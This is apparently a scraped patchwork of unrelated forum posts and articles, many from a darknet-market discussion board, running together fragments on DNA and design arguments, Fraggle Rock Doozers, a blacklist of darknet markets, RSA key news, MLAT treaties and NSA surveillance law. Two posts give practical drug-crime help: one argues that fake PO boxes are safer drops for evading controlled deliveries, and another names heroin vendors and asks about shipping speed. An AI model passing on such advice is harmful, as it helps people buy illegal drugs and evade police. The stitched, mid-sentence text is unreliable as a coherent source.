The order in which they are arranged instructs the cell's actions.What is amazing is that within the tiny space in every cell in your body, this code is three billion letters long!!2To grasp the amount of DNA information in one cell, ""a live reading of that code at a rate of three letters per second would take thirty-one years, even if reading continued day and night.""3 Wait, there's more.It has been determined that 99.9% of your DNA is similar to everyone's genetic makeup.4 What is uniquely you comes in the fractional difference in how those three billion letters are sequenced in your cells.Dr. Francis Collins, director of the Human Genome Project (that mapped the human DNA structure) said that one can ""think of DNA as an instructional script, a software program, sitting in the nucleus of the cell.""5Perry Marshall, an information specialist, comments on the implications of this. ""There has never existed a computer program that wasn't designed...[whether it is] a code, or a program, or a message given through a language, there is always an intelligent mind behind it.""6Just as former atheist Dr. Antony Flew questioned, it is legitimate to ask oneself regarding this three billion letter code instructing the cell...who wrote this script? Who placed this working code, inside the cell? ; Meyer shares with readers the excitement of the most recent discoveries, as the digital technology at work in the cell has been progressively revealed. The operating system embedded in the genome includes -Nested coding, -Digital processing, -Distributive retrieval and storage systems. It is very extraordinaryâthe terminology is all recognizable from computer science.; If I was to ask you Do other intelligent life forms exist in the universe? What would you say? ;I know you weren't asking me Riposte but my answer would be I literally don't know. I would like to think that somewhere out there in the vast cosmos of outer space there are other intelligent civilizations who inhabit a planet similar to Earth who have the same thoughts as we do regarding meeting alien life forms and will we ever find them. Really, who knows what the future holds but considering it would take a human over 300+ years of continuous (24/7 - 365 days a year) space travel to reach the former last planet in our solar system, Pluto, I think the aliens would need to be the ones who make contact with us. There is no possibility of life on the other planets (Mars is still up for debate but nothing concrete) in our solar system however ours is but one of BILLIONS of other solar systems and galaxies out there which may contain alien life forms so I would never say never on that subject. The problem is that space is infinite meaning it's just so big that it's beyond the comprehension of most people. It literally never ends.....................................; And of course we cannot explain who is above god and how s/he got there that is greater than whole. Just because a goldfish cannot jump out of a fish tank that does not make the argument null and void Otherwise we will get into an endless debate of who is above god above god we can only describe it the best we can up to the point of god. ;While I do believe there is some form of life after death (whether it's God or some other spiritual being), the fact is none of us will know until we die ourselves. God may be someone that people worship and dedicate a large portion of their life to by attending Church, Mass, gatherings, etc each week however having a belief in something certainly doesn't make it reality. There's a lot of people who believe in a variety of different things and that's their personal choice to make however why is it that you cannot explain to me who is above God? I you don't know anything about who may be above God then surely you couldn't describe him/her/them to anyone? That's just ridiculous to suggest you could describe an unknown entity. Discussing a theory about what happened is one thing however when you start to actually believe them, especially when we're talking millions of years ago, you're drawing a long bow IMO.Anyway Riposte, we're getting in way too deep here for my liking because I'm getting a headache!"

They love to work hard and can build just about anything from the ground up including the great Egyptian Pyramids. Below is a little snippet of what the Doozers are all about and as I'm sure you'll agree Ben, they sound like a team of skilled tradies which are more than capable of building structures like the great Pyramids in Egypt. The deciding factor for me was when I discovered that the Doozers were in fact noted experts in the use of Pythagoras' theorem!

They're tiny, green creatures who usually sport construction helmets, boots, and tool belts. Doozers stand approximately knee-high to Fraggles, at six inches tall. [1]Unlike Fraggles, Doozers love to work all day long, and they hate playing games. Most Doozers are construction workers, while others are architects or miners. With the help of various Doozer machines and vehicles, they build elaborate constructions all over Fraggle Rock, like towers, buildings, roads and bridges.Their building materials, Doozer Sticks, are made of radish dust. Doozer Sticks are the Fraggles' favorite snack, and they love to eat the buildings that Doozers build. The Doozers don't mind their buildings being eaten; if the Fraggles didn't eat the constructions, the Doozers would run out of building space, and if they ran out of building space, they would have to move away from Fraggle Rock or else they would die.Doozers and Fraggles usually show very little respect towards each other. It's very rare for Fraggles and Doozers to make friends. Cotterpin is one of the few Doozers who likes to communicate with them.The Doozers all live together at Doozer Dome. They work together in a society that values cooperation in order to further the common good (which is very much contrary to the Fraggles, who place a high value on individualism and independence). The Doozers pride themselves on the good work that they do, but no Doozer is allowed to take personal credit for their work -- that would mean that they thought their work was better than everyone else's, and would be destructive to the communal spirit. Competition is seen as a vice that occasionally afflicts Doozers. Again, this is very unlike the Fraggles, who love to have races and competitions, and who take pride in their individual jobs and passions.The Doozers' diet is rarely mentioned. However, it has been mentioned that a favorite is a jelly filled food pellet (which is never available; they only have custard).The Doozer puppets and their vehicles are performed with radiographic controls, usually with the help of a waldo.Main Doozer characters on the show include Cotterpin, her parents Flange and Wingnut, her best friend Wrench, and the Architect Doozer. Nearly all the Doozers are named after tools or construction equipment.Doozer helmets come in red, orange, yellow, blue, purple, pink and white. A higher rank of Doozer is a Bull Doozer and they have a disk on their helmet to signify their rank. "

Here are some figures I just dug up: The average rate of fatalities per 100,000 full-time equivalent workers is 3.5.Keeping that in mind, here are the top 10 occupations with the highest fatality rates:1.    fishers and related fishing workers: 116.02.    logging workers: 91.93.    aircraft pilots and flight engineers: 70.64.    farmers and ranchers: 41.45.    mining machine operators: 38.76.    roofers: 32.47.    refuse and recyclable material collectors: 29.88.    driver/sales workers and truck drivers: 21.89.    industrial machinery installation, repair and maintenance workers: 20.3, and10.  police and sheriffâs patrol officers: 18.0.These are American statistics for 2010, so they would undoubtedly factor-in the higher-risk due to the prevalance of firearms in the U.S.  Source: http://www.safetynewsalert.com/top-10-jobs-with-high-death-rates/The disparities with other countries should be correspondingly greater. Bear this in mind, the next time you hear an American cop say, ""I was in fear of my life,"" as justification for shooting someone.

Any market on this list should not be used or accessed and is blacklisted because they: 1). Scammed users by shutting down the site and taking user's funds. 2). Practiced improper security and put their users and themselves at risk. 3). Blatantly lied to users in a way which could put them at risk. 4). Got hacked and were unable to recover. 5). Support is non-existent or site is suffering severe technical problems 6). The site was taken down by LE. 7). Has had a significant amount of downtime.                                                                                The Wall of Shame  Atlantis Market: Shut down sometime after the SR1 takedown and took users' funds.  Sheep Marketplace: Shut down shortly after a massive heist in December 2013, perhaps the worst ever seen on a DNM, in which US$6 million dollars (possibly much, much more) worth of BTC was stolen by hackers. The massive number of BTC caused tumbler Bitcoin Fog to crash. It is believed that the hacker(s) disposed of the BTC by selling them to BTC-E, Coinbase, etc.   Deepbay: Short-lived scam site. Admin is believed to have disabled withdrawls and took users' BTC before shutting down.  Budster: Site shut down after vendor Turtle Time allegedly hacked into and stole around 400 BTC from users.  Project Black Flag: Site shut down and the admin took users' funds.  TorMarket: Site shut down, possibly seized by LE. One theory is that the site's admin was snitched out by a former SR2 mod when he was arrested back late-2013-early-2014.  FloMarket: Admin shut down site and took users' funds, although he denied it in a later interview.  Cantina Marketplace: Security was poor and buggy from the start, although the site's admin denied it. The site had tons of SQL injection errors (they offered a 5 BTC bounty to anybody who could successfully perform one onto their market to prove its security) but the marketplace's admin and mods denied such claims despite the evidence. Basically a very poorly built and designed market and very vulnerable to hackers and LE.  Black Goblin Market: Short-lived site due to such poor design. Within maybe 5 days from launch, the site was ""de-anonymized"", which may be worse than being hacked, as it opens the path for an easy LE investigation; they can easily subpoena the host or ISP to get everything they know, like what's on the server, what IPs connect to it, who was paying for it, etc. And this means such a market can never get very big or last very long.  Utopia Marketplace: Seized by Dutch police in early-2014.  Silk Road 2.0 (SR2): Where to start on this one? Despite vastly improved security over SR1, the site was supposedly hacked on Febuary 13, 2014 with US$2.7 million dollars worth of users' funds in escrow being stolen. The admin ""Defcon"" stated that the hack had been made possible due to a vulnerability in Bitcoin's protocol called ""transaction malleability"". However, in all likelihood, Defcon and a couple of close mods were the true thieves of the BTC and they made up the ""transaction malleability"" as an excuse to cover the heist. A dedicated group of mods did pay back many of the ripped off users by using their own commission funds, but the marketplace was in clear decline after the incident. The site was seized by LE on November 6, 2014 with Defcon (Blake Benthall) and most of his mods being arrested as part of the massive Operation Onymous.   MixBit Cointumbling: Scamsite that will successfully process smaller amounts of BTC, but in larger amounts will simply take your money and run. They are very slow too.  Drugslist: The admin is MIA; probably having stolen users' funds and ran off.   Pandora: Site was hacked by 2 former vendors who successfully stole 1/2 of the site's/users' funds. Later the admins allegedly shut down the site and took users' funds.  The Armory: Originally a sister site to SR1 but it shut down in 2012 due to lack of demand for guns. The site appeared again later and worked for a bit, but it quickly became a scamsite, using a shady escrow system and not processing orders. The site went offline in early-2014, probably as part of an exit scam.  TorEscrow: Former escrow service that pulled a large exit scam around the time of 4/20/2014 by disabling withdrawls and deleting the site along with its forums.  Cannabis Road: Site shut down after it cliamed it had been robbed. The more likely theory is that its admin and mods stole its users' funds and ran off.  The Pirate Market: Disabled withdrawls and the site's hosts have disappeared. Most likely as part of an exit scam.  1776 Marketplace: Hosted on a Windows server, a serious OPSEC issue.  BitBlender: They claimed they were hacked and lost money. However, the site's admins likely stole the money.  Hydra: Seized by LE on November 6, 2014 as part of Operation Onymous.  Cloud-Nine (C9): Seized by LE on November 6, 2014 as part of Operation Onymous.  Alpaca Marketplace: Seized by LE on November 6, 2014 as part of Operation Onymous.  BlueSky: Seized by LE on November 6, 2014 as part of Operation Onymous.  Tor Bazaar: Seized by LE on November 6, 2014 as part of Operation Onymous.  Diabolus Marketplace: Renamed themselved to SR3/SRR after the SR2 takedown. Trying to grow and cash in on the name.  Andomeda: Supposedly seized by LE on November 18, 2014; however, many believe it's fake and the site's hosts pulled an exit scam.  Torbook: Facebook-style DNM social network literally designed by a 17 year old; need I say more? Oh yeah, the site's admin was arrested by Belgian police and the site went into maintnence mode. Had CP posted on it. Likely seized by Belgian LE.  UPDATE (12/29/2014)  Black Market: Don't let the slick site design fool you, it's actually a well-known scamsite. Huge quantities of drugs, guns, and counterfeits of the highest quality for sale cheaply and with no escrow, it seems to good to be true; because it is.",""

I thought it would be an interesting read for you guys Original article posted here: http://www.techworm.net/2015/05/two-security-researchers-break-rsa-4096-bit-keys-with-phuctor.html  ""Researchers break into the final realm of Cryptographic keys; should we be afraid? Experts say RSA encryption is still safe  Two security researchers have supposedly broken into three pairs of one of the strongest RSA 4096 bit keys by using their online tool known as âPhuctor.â How far is this true? Well, Hanno BÃ¶ck confirms this news is not true and further proves that the RSA cryptosystem has not been broken yet.  RSA is a public key cryptosystem which is majorly used when one needs to ensure security during the transmission of potential data. This method of transmission of storing data and sending it in a particular format to specific person is known as cryptography. Generally, a cryptosystem would comprise of three algorithms: one for Key generation, second for encryption and third for decryption.  The security of RSA cryptosystem depends on a public key which is used for data encryption and from this a private key is generated which is used for data decryption. The private key is very important and should be kept secret.  The public key is further comprised of two values, one of this is the modulus and it is made up of two large prime numbers which is further responsible for the security of the RSA bit keys. The public and private keys are interconnected, hence if an attacker succeeds in finding the value of public key they can use mathematical factorization method to determine the corresponding private key and thus break the RSA cryptosystem.  Factoring the two large prime numbers involved in the public key is very difficult hence RSA encryption is considered to be a very strong cryptosystem.  On Sunday; however two security researchers Stanislav Datskovskiy and Mircea Popescu, surprisingly were able to factor one of the keys that belonged to H. Peter Anvin also known as âhpaâ. Anvin is a Linux kernel developer and he is well known for his contribution to the open source community.  The two security researchers, Datskovskiy and Popescu have created their own online tool known as âPhuctor: The RSA Super Colliderâ which is used to check if there is any common factor in the moduli of two different public keys.  The Phuctor tool, basically calculates the greatest common divisor (GCD) of two large numbers by using the euclidean algorithm method. With the GCD it is able to find the shared prime number and in turn it can calculate the private key.  As per its creators, Phuctor is able to process almost four million publicly known keys and if the tool is able to break any of the keys then this is informed privately to the owner by sending an email to the address that has been included in the key, furthermore the key is also removed from service.  In his Sundayâs blog post, Popescu mentioned: âexpect a key to be factored just a little before Elvis comes back as the Queen of England.â  As per the security researchers, Anvinâs private key must have been created recently and to be very specific they have mentioned the creation date as September 22, 2011; however they feel that most probably the key is no longer being used by its creator, Anvin.  In response to Popescuâs blog, Hanno BÃ¶ck, a German freelance journalist updated the Hacker news stating that the news regarding RSA key being broken is incorrect. However, he felt that he needs to address this matter with a detailed explanation and hence wrote his blog post on Sunday.  In his blog post, BÃ¶ck mentioned that just previous year he had analyzed the data on servers that holds the public keys. Then, he had found a huge number of vulnerable keys on that server which took him by surprise. However, when he got to a much closer analysis he realized that those vulnerable keys were actually the faulty keys.  Hence, BÃ¶ck believes that the RSA encryption system is much stronger and there is no fault with this system yet. He feels that the major fault is with the generation and manipulation of these public keys.  BÃ¶ck, was not able to determine the exact reason for this corruption and just assumed that the faulty keys could be due to network errors, hard disk failures or software bugs.  He feels that the faulty keys could be a result of some one just uploading a key to the server without any proper verification or another possibility could be that someone could have added an invalid signature to a broken key and uploaded it to the server.  In his blog post, BÃ¶ck mentioned: âHowever these keys should pose no threat to anyone. The only case where this could matter would be a broken implementation of the OpenPGP key protocol that does not check if subkeys really belong to a master key.â  In addition, BÃ¶ck feels that one cannot import a corrupt key into the local installation of GnuPG because logically as the key would not pass the signature validation it would be rejected by the server.  As per BÃ¶ck the actual factoring of RSA 4096 bit key can occur only under certain conditions; one if the keys have been generated with some broken entropy source and other condition when GPG implementation has been tampered.  Hence, it can be concluded that the RSA cryptosystem is strong and has not been broken yet!""  ",""

''Simply put in a sample of your urine and the computer will diagnose your problem and tell you what you can do about it. It only costs $10."" Bill figured he had nothing to lose, so he filled a jar with a urine sample and went to the drug store. Finding the computer, he poured in the sample and deposited the $10. The computer started making some noise and various lights started flashing. After a brief pause out popped a small slip of paper on which was printed: ""You have tennis elbow. Soak your arm in warm water. Avoid heavy lifting. It will be better in two weeks.""  Later that evening while thinking how amazing this new technology was and how it would change medical science forever, he began to wonder if this machine could be fooled. He mixed together some tap water, a stool sample from his dog and urine samples from his wife and daughter. To top it off, he masturbated into the concoction. He went back to the drug store, located the machine, poured in the sample and deposited the $10. The computer again made the usual noise and printed out the following message:  ""Your tap water is too hard. Get a water softener. Your dog has worms. Get him vitamins.

","General Discussion/Security","gotta disagree with you madhatter about it beeing always unsafe to order to a fake PO Box. I would even rank them to be rather one of the safer kind of drops, compared to the alternatives. But I wouldnt say that generally, it depends on some other factors..  You are right, if you get caught red-handed when you are at the PO Box, you cant play the ""It wasnt me who ordered it, I dont know shit""-card, but if you think realistically, in most cases you wont play that card in court anyway. I dont know if this is internationally the same law, but as far as I know, they dont have to prove that you have ordered it (although it certainly helps them if they can), it depends if the judge buys your story or not. so if you are 70 years old, go to church every sunday, never broke a law and your appartment is 100% drug and drug utensil free, then it might perhaps really be a bit safer to just order to your real address. But for most drug users some or even all of these points apply:  - history with LE eg. some events in the past where they got busted - have drugs, utensil or even dealer equipment at home - just look like they probably use drugs - and many more kinds of evidence that makes it hard for the judge to believe the bullshit story of them claiming to have nothing to do with it. (Does this even happen in real life? My guess is that this applies perhaps to every 1000th order where the recipient actually really didnt order it and doesnt know why he got it for real)  so besides that lying about it isnt a real option in most cases, there arent many other downsides of ordering to a fake PO Box (and I am not talking about a hacked one) but some advantages. The shipping usually is more anonymous since your real name and address isnt connected anywhere to the purchase. If LE intercepts the package, they cant make a controlled delivery. They would have to observe the PO Box day and night.. and you have 1-2 weeks time to get your package.. so you must be really interesting for them that they invest so much manpower and time just to ""try"" to catch you. and there are PO Boxes that are located at places where it is hard for LE to observe inconspicuously, with good opportunites of escape if something's fucky.  So for me personally, a fake PO Box seems safer than most alternatives. But it doesnt automatically apply to everybody, you always got to check your own circumstances, collect pros and cons and how likely they are to happen.  what is rather safe for you, can be unsafe for somebody else.. so you should always decide your actions based on your own personal situation, switch things up from time to time, and dont stick and rely too much on generalities.",""

In money laundering cases, they can be extremely useful as a means of obtaining banking and other financial records from our treaty partners. MLATs, which are negotiated by the Department of State in cooperation with the Department of Justice to facilitate cooperation in criminal matters, are in force with the following countries:   Antigua and Barbuda,   Argentina,   Australia,   Austria,   the Bahamas,   Barbados,   Belgium,  Belize,   Bermuda,   Brazil,   Canada,   Cyprus,   Czech Republic,   Dominica,   Egypt,   Estonia,   France,   Germany,   Greece,   Grenada,   Hong Kong,   Hungary,   India,   Ireland,   Israel,   Italy,   Jamaica,   Japan,   Latvia,   Liechtenstein,   Lithuania,   Luxembourg,   Malaysia,   Mexico,   Morocco,   the Kingdom of the Netherlands (including Aruba, Bonaire, Curacao, Saba, St. Eustatius, and St. Maarten),   Nigeria,   Panama,   Philippines,   Poland,   Romania,   Russia,   St. Lucia,   St. Kitts and Nevis,   St. Vincent and the Grenadines,   South Africa,   South Korea,   Spain,   Sweden,   Switzerland,   Thailand,   Trinidad and Tobago,   Turkey,   Ukraine,   United Kingdom (including Anguilla, British Virgin Islands, Cayman Islands, the Isle of Man, Montserrat, and Turks and Caicos),   Uruguay, and   Venezuela.    In addition, on February 1, 2010, 27 U.S.-EU Instruments/Agreements/Protocols entered into force that either supplemented existing MLATs or created new mutual legal assistance relationships between the United States and every member of the EU. In 2013, the United States entered into an MLAT with the Kingdom of Jordan, but it is not yet in force. A mutual legal assistance agreement has been signed by the United States but not yet brought into force with Colombia. The United States is engaged in negotiating additional MLATs with countries around the world. The United States also has signed and ratified the Inter-American Convention on Mutual Legal Assistance of the Organization of American States, the United Nations Convention against Corruption, the United Nations Convention against Transnational Organized Crime, the International Convention for the Suppression of the Financing of Terrorism, and the 1988 UN Drug Convention.  Agreements  In addition to MLATs, the United States has a Mutual Legal Assistance Agreement (MLAA) with China, as well as a MLAA between the American Institute in Taiwan and the Taipei Economic and Cultural Representative Office in the United States. The United States also has entered into bilateral executive agreements on forfeiture cooperation with 20 countries, including: Andorra, Anguilla, Austria, British Virgin Islands, Canada, the Cayman Islands, Colombia, Dominican Republic, Ecuador, Hong Kong, Jamaica, Mexico, Monaco, Montserrat, the Netherlands, Singapore, Turks and Caicos Islands, the United Kingdom, and the Bailiwicks of Jersey and Guernsey (in drug cases only).  Treasuryâs Financial Crimes Enforcement Network (FinCEN) has a Memorandum of Understanding (MOU) or an exchange of letters in place with many other financial intelligence units (FIUs) to facilitate the exchange of information between FinCEN and the respective countryâs FIU.

The Open Technology Institute has written the story of those years in the mid-1990s.    The act that truly launched the Crypto Wars was the White House's introduction of the ""Clipper Chip"" in 1993. The Clipper Chip was a state-of-the-art microchip developed by government engineers which could be inserted into consumer hardware telephones, providing the public with strong cryptographic tools without sacrificing the ability of law enforcement and intelligence agencies to access unencrypted versions of those communications. The technology relied on a system of ""key escrow,"" in which a copy of each chip's unique encryption key would be stored by the government. Although White House officials mobilized both political and technical allies in support of the proposal, it faced immediate backlash from technical experts, privacy advocates, and industry leaders, who were concerned about the security and economic impact of the technology in addition to obvious civil liberties concerns. As the battle wore on throughout 1993 and into 1994, leaders from across the political spectrum joined the fray, supported by a broad coalition that opposed the Clipper Chip. When computer scientist Matt Blaze discovered a flaw in the system in May 1994, it proved to be the final death blow: the Clipper Chip was dead.    Nonetheless, the idea that the government could find a palatable way to access the keys to encrypted communications lived on throughout the 1990s. Many policymakers held onto hopes that it was possible to securely implement what they called ""software key escrow"" to preserve access to phone calls, emails, and other communications and storage applications. Under key escrow schemes, a government-certified third party would keep a ""key"" to every device. But the government's shift in tactics ultimately proved unsuccessful; the privacy, security, and economic concerns continued to outweigh any potential benefits. By 1997, there was an overwhelming amount of evidence against moving ahead with any key escrow schemes.The Second Crypto War is going to be harder and nastier, and I am less optimistic that strong cryptography will win in the short term."

GuardianRom started out as a secure version of Android. Based on top of the Android Open Source Project we created a new, more secure operating system. Since we started working on this project in 2012 we have hit many milestones that we set out and are now looking to advance the project into it's next stage.  Features:  GuardianRom is designed from the ground up to protect your data from theft. To achieve our high-level of security we use a multi-level approach. Starting with the Kernel and working upwards from there to keep Cyber Criminals and Governments out of your private communications. Some of the features included are:      Full-Disk Encryption (Military Grade AES-256Bit-XTS) Custom hardened kernel to prevent and mitigate exploits.     IT Policy Management Tools for enterprise users. (MDM Solution) Duress Password (AKA HiddenOS): Enter one password for daily use and another in case you are forced to hand over your phone.     File-Level Encryption: All incoming messages & personal files (Text, E-Mail, Call Logs, Contacts, etc) are encrypted with your lockscreen password. Preventing an attacker from stealing your most important files even if your phone is on.      LockDown Mode: This mode forces all data to be encrypted before it is sent out. Only Encrypted Calls & SMS work here. No worry about data leaks.     Tor Access: When you need to go anonymous Tor is at your disposal. Our custom Tor app forces the apps you choose through it. All cookies and other data are removed after each session automatically.     Dead-Mans-Switch/SOS: This option allows you to set a time or button. If you don't respond in that amount of time OR you press the SOS button the phone will auto-matically alert your trusted contacts with your GPS location, live video/audio stream and optionally wipe your sensitive data.     Geo-Fencing: Disable WiFi/BT, force your phone to turn off or even use a VPN all based on location. These are just some of the many features we are working on.  http://www.guardianrom.com/  ",""

What h threads are pretty active? I'd like to know, I check up on agora's forums when I can. Evo's were good but evo's gone. I used nucleus a few times after evo died. And also reddit, but now I'm iffy about reddit, it's not safe. Which is why I came here =) You said you would include this vendor in the blacklist, who, speedy_j or nocturn4l?  I live in the US, but I usually go with european vendors. Tom_and_jerry is my current guy and I plan on working with him like clockwork unless I get scared about the customs thing.. I prefer heroin #3 because the vendor's that sell it usually buy it in bulk and can sell it for a price cut. I don't see that with US vendors, they might do price cuts up to 1 gram, maybe 3.5. In my humble opinion the heroin #3 is just as good for the price maybe better than the $150-200 per gram shit in the US. Unless .05 of it were to completely knock me on my ass, I don't see myself paying more than 100 for a gram, unless I've got the cash and am feeling like a connoisseur, trying out the world's heroin for the love of experimenting with good heroin =) I prefer a great rush of euphoria and legs, the nod is somewhat important but I need the euphoric rush first of all. With that being said, right now I'm looking for a domestic vendor. See, I ordered from Nocturn4l and lately I have been reading all over reddit that he has been selective scamming, and that he has done it in the past. I always thought he was a good vendor, always read the good reviews so I ordered from him the first time on wednesday or so, said it's go out thursday. It may or may not happen to me..him scamming me, that is. But just in case I'd like to buy some from a reliable vendor that'll ship to me fast, something that can hold me over till Friday and I'll be good then. I'm thinking brownjames, how is he? I messaged him and he said it'd take 1-2 days with priority mail, 1 with express. I think I believe him cuz he said a little more than that that I'm not gonna put on here. Also he has the silk road verification... which might not even mean shit but I assume it does. I asked fnugs and he said it'd take 2, maybe 3, but most likely 2. What about indoorcomfort? owlcity? greenblvd? I asked all of them how long shipping would take to my destination...which is somewhere in the south =) edit: what about realsupremesmoke? I heard his shipping is fast...but idk where it's coming from. What I really need is a H vendor black list =)  I gotta do somethin fast though. Like I said, I'll be good friday. But there is a long work week in between now and then.  If you could, read this reddit here: http://pay.reddit.com/r/TheAgoraMarket/comments/308jwv/best_heroin_vendor/  He describes what I'm looking for exactly, and we're interested in the same vendors.","also i post on a few h threads and there are a fair number of h dealers currently either scamming or having done so with the demise of Evo i will include this vendor as one to watch on these threads as well.;I know of many vendors, and can help with suggestions.

I was like oh shit, sorry man, if this can't go out with the Saturday ship from Germany just put it in the regular mail from the Netherlands on Monday, otherwise it won't get shipped till NEXT Saturday. He said don't worry about it, yes it's too late but it will be shipped/put in the mailbox from Germany on Sunday, 3/15. I haven't gotten my package. He said something about he had to do something then would get all the packages out... I forgot exactly how he said that but I was thinking maybe he was trying to withdrawal his btc and cash out, maybe was having trouble since evo disabled btc withdrawal? Evo went down on 3/18 but had been acting up days before then. I'm thinkin he saw evo holding his btc and was waiting to ship my stuff out, why lose more money than he has to? like if I can't even get my coins now why ship more product out that I can't get the coins for, and be out of money and product?Anyways I'm worried. I have since ordered from the netherlands and had received it with no problem at all. I just read something about new customs restrictions here on the hub. What new customs restrictions? Where, for who? and When?"

Example, I have the funds to smoke top shelf buds all day long, but I like many others am keen on finding a deal, or something that is priced below its quality level, so I shop around.

It was most certainly not the greatest bud, nor is it even considered excellent bud, but for $85 an Oz it beats the pants off of schwagg and is actually trimmed bud that doesnt taste like diesel fuel or some other disgusting crap.  Now lets consider a drug like Cocaine. Everyone knows that 99% of all Coke on the market is cut with something or the other. User purchases a gram of powder and reports ""For the price its good shit"". Does this mean that the Coke is bad quality? No it means that the user feels that for the price paid the quality is sufficient.

"," By Stephen Dinan - The Washington Times - Tuesday, June 2, 2015The NSAâs phone-snooping program is on its last legs after senators voted Tuesday to approve the USA Freedom Act, banning bulk collection of Americansâ data two years after the practice was revealed to the public by Edward Snowden.President Obama signed the bill late Tuesday, moving quickly to kick-start several Patriot Act powers that expired this weekend after senators missed a deadline for renewing them.But the bill, which cleared the Senate on a 67-32 vote, puts limits on a key power. Investigators still can demand businesses to turn over customersâ documents and records, but the data must be targeted to individuals or groups and cannot be done indiscriminately.The National Security Agency must end its snooping program within six months, forcing intelligence officials to set up a system that will leave the information with phone companies. Investigators will be able to submit a query only if they have a specific terrorism lead.âItâs the first major overhaul of government surveillance in decades and adds significant privacy protections for the American people,â said Sen. Patrick J. Leahy, a Vermont Democrat who led a two-year fight to end the NSAâs snooping. âCongress is ending the bulk collection of Americansâ phone records once and for all.âSupporters of the NSA program predicted that intelligence officials will not be able to get the same kinds of results if phone companies rather than government agencies hold the data.Senate Majority Leader Mitch McConnell, Kentucky Republican, said Mr. Obama will be blamed for weakening U.S. security and that the NSA programâs end was in line with the presidentâs opposition to detaining suspected terrorists at Guantanamo Bay, Cuba, and failing to confront the Islamic State.âThe presidentâs efforts to dismantle our counterterrorism tools have not only been inflexible, they are especially ill-timed,â Mr. McConnell said.But it was the majority leaderâs miscalculations about scheduling that backed NSA supporters into a corner. Mr. McConnell wanted the entire program to be extended and tried to use the June 1 expiration deadline to force fellow senators into a take-it-or-leave-it choice. But his colleagues, including a large percentage of Republicans, rejected his bid, sending the Senate over the deadline and undercutting Mr. McConnellâs leverage.On Tuesday, Mr. McConnell made a last-ditch effort to change the bill, doubling the six-month grace period for the NSA and requiring the government to certify that it could keep producing the same results even without storing the phone data itself.Even some senators who were sympathetic to his cause, though, voted against the amendments, saying any changes would have sent the bill back to the House and prolonged the fight, leaving the Patriot Act neutered in the meantime.Nearly half of Senate Republicans voted for the USA Freedom Act, joining all but one Democrat and a Democrat-leaning independent.The vote was a major vindication for the House, which for the second time this year has driven the legislative agenda on a major issue, striking a bipartisan compromise that senators were forced to accept.The bill also had the backing of the intelligence community, which has assured Congress that it wonât be giving up any major capabilities and can make the new system work even with the data held by phone companies instead of the NSA.Mr. Obama initially defended the program, but after several internal reviews found it to be ineffective and potentially illegal, he said he would support a congressional rewriting to end the law.The George W. Bush and Obama administrations justified the program under Section 215 of the Patriot Act, which gives federal investigators power to compel businesses to turn over customersâ documents and records. Using that power, the NSA demanded the metadata â the numbers, dates and durations involved â from all Americansâ calls.The information was stored and queried when investigators suspected a number was associated with terrorism and wanted to see who was calling whom.Backers said the program didnât impinge on Americansâ liberty because the information, while stored by the government, wasnât searched until there was a specific terrorism nexus. They said there were never any documented abuses of the program.But opponents said repeated reviews, including one last month by the Justice Departmentâs inspector general, found the program has never been responsible for a major break in a terrorism case. Given its ineffectiveness, they said, it was time to end it.Sen. Ron Wyden, an Oregon Democrat who had been battling behind closed doors for years as a member of the intelligence committee to end the program, said the vote was a first step.He said he and like-minded colleagues now will turn to other powers under the Foreign Intelligence Surveillance Act that the government uses to scoop up emails â a power Mr. Wyden said is increasingly gathering information on Americans, contrary to its intent.âThis is only the beginning. There is a lot more to do,â he said.Some of Mr. Wydenâs colleagues in those fights, including Sen. Rand Paul, Kentucky Republican, voted against the USA Freedom Act.âForcing us to choose between our rights and our safety is a false choice,â said Mr. Paul, who is running for the Republican presidential nomination and making his stand against the Patriot Act a major part of his campaign.Mr. Paul even used the obstruction powers the Senate gives to a single lawmaker to block action Sunday, sending Congress hurtling across the deadline and causing three powers to expire: the records collection, the ability to target âlone wolfâ terrorists and the power to track suspected terrorists from phone to phone without obtaining a wiretap each time.The lone-wolf and wiretap powers were extended without changes.;ORT MEADE, MDâExpressing frustration over Congressâ decision to let the provisions allowing the bulk collection of phone data expire, annoyed National Security Agency officials reported Monday that the organization would now be forced to rely exclusively on mass surveillance programs that have yet to come to light. âUnfortunately, lawmakers chose to limit our intelligence-gathering capabilities by discontinuing key sections of the Patriot Act, and now we have no choice but to depend on a number of other civilian-monitoring initiatives that continue to remain hidden from the public,â said NSA director Michael Rogers, adding that, although the agency still has a wide variety of covert hacking, wiretapping, and GPS-tracking programs at its disposal that have not yet been exposed by whistleblowers or investigative journalists, the end of its ability to record the phone data of millions of Americans still represents âa fairly sizable inconvenienceâ for the organization. âObviously, we will continue to carry out our duty of protecting the United States, but without the powers granted to us under Section 215 of the Patriot Act, I guess weâll just have to make do with our Dark Sky systems, the Linguos Protocol, and Project OPTIC, among several dozen others.â Rogers noted that while the NSA was disappointed to see the old metadata collection program lapse, ultimately the capabilities of its newer surveillance projects make the old one look miniscule in comparison.;The story being spun by the defenders of Section 215 of the Patriot Act and the Obama Administration is that if the law sunsets entirely, the government will lose critical surveillance capabilities. The fearmongering includes President Obama, who said: âheaven forbid weâve got a problem where we couldâve prevented a terrorist attack or couldâve apprehended someone who was engaged in dangerous activity but we didnât do so.âSo how real is this concern? Not very. Section 215 is only one of a number of largely overlapping surveillance authorities, and the loss of the current version of the law will leave the government with a range of tools that is still incredibly powerful.First, thereâs the most famous use of Section 215âthe bulk collection of telephone records by the NSA. Of course, no matter what law the government relies on, bulk surveillance is unconstitutional. But equally importantly, it doesnât work. Every assessment about the bulk collection of telephone records, including two by hand-picked administration panels, have concluded that âcollecting it allâ hasnât materially aided any terrorism investigation. The same goes for other still-secret bulk surveillance programs under Section 215, the latest evidence of which came in a recently released oversight report by the Justice Departmentâs Office of the Inspector General (OIG).And then thereâs the matter of targeted investigations. The ACLUâs Jameel Jaffer has explained that this too is scaremongering, because âthe sunset of Section 215 wouldnât affect the governmentâs ability to conduct targeted investigations of terrorist threats.â  Thatâs because even without Section 215, the government still has broad powers to collect information during its national security investigations. EFF believes that many of these laws can be scaled back and made more transparent as well, but given the current situation, these are the tools in the national security investigatorsâ toolbox: Â·      Pen Registers: These allow the government to collect âdialing, routing, addressing, or signaling informationâ including telephone numbers dialed and Internet metadata such as IP addresses and email headers. There are two pen register statutes, one for foreign intelligence surveillance and one for law enforcement. Both rely require only that the pen register be likely to obtain information relevant to a national security or criminal investigation respectively. Until the end of 2011, the NSA used the Foreign Intelligence Surveillance Act (FISA) pen register statute to conduct mass surveillance of Internet metadata, much as it still uses Section 215 for mass collection of telephone records.Â·      The Pre-Patriot Act Business Records Provision: Before the passage of the Patriot Act in 2001, FISA contained a provision allowing the government to obtain business records from transportation carriers and 